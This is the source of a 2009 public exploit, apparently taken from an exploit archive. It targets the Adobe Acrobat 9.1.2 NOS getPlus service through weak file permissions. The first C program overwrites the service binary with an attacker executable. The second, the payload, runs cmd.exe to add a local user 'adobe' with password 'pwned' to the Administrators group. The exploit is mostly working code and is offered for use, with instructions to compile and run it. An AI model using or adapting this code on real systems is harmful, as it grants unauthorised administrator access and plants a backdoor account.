/*
alwaysdirtyneverclean.c
AKA
Adobe Acrobat 9.1.2 NOS Local Privilege Escalation Exploit (alwaysdirtyneverclean.zip)
BY
Jeremy Brown 2009 [0xjbrown41@gmail.com] 07.21.2009
***********************************************************************************************************
I've been up for nearly 24 hours (only the last few doing research though). This exploit is based on the
brief information provided by Nine:Situations:Group (http://www.milw0rm.com/exploits/9199). Exploiting
improper permissions is fun. A few notes are in order though. The getPlus service (that I tested, via 9.1.2)
isn't installed as an "Automatic" service, therefore making it slightly harder (but not hard) to practically
use to your advantage. But I tested running this code under a GUEST account and it worked pretty good (just
the first time though). Change the values as needed, compile and run. Things could be more or less silent,
lethal or non-lethal... it is completely up to you. Things cannot get much simpler than this :)

Tested on Windows XP SP3 + Adobe Acrobat 9.1.2 (installed from adobe's download manager, then updated)

But maybe give Adobe a break? 2009 has been a rough year for them already, heh. Sleep time.
***********************************************************************************************************
alwaysdirtyneverclean.c
*/

#include <stdio.h>
#include <windows.h>

#define DEFAULT_TARGET  "C:\\Program Files\\NOS\\bin\\GetPlus_HelperSvc.exe"
#define DEFAULT_BACKUP  "C:\\Program Files\\NOS\\bin\\GetPlus_HelperSvc.exe.bak"
#define DEFAULT_EXECUTE "C:\\Documents and Settings\\All Users\\Documents\\bin.exe"
//#define DEFAULT_EXECUTE "C:\\WINDOWS\\system32\\calc.exe"

int main(int argc, char *argv[])
{

     MoveFile(DEFAULT_TARGET, DEFAULT_BACKUP);
     CopyFile(DEFAULT_EXECUTE, DEFAULT_TARGET, FALSE);
     // shakee and bakeee

     return 0;

}
///////////////////////////////////// cut /////////////////////////////////////

/*
bin.c
FROM
Adobe Acrobat 9.1.2 NOS Local Privilege Escalation Exploit (alwaysdirtyneverclean.zip)
BY
Jeremy Brown 2009 [0xjbrown41@gmail.com] 07.21.2009
*/

#include <stdio.h>
#include <windows.h>

#define CMD "C:\\WINDOWS\\system32\\cmd.exe"
#define ONE "/C net user adobe pwned /add"
#define TWO "/C net localgroup administrators adobe /add"

int main(int argc, char *argv[])
{

STARTUPINFO si = {sizeof(STARTUPINFO)};
PROCESS_INFORMATION pi;

     CreateProcess(CMD, ONE, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
     CreateProcess(CMD, TWO, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
     // mmmmmmmmmmm.. chocolate browie ice cream smoothes are goooood

     return 0;

}
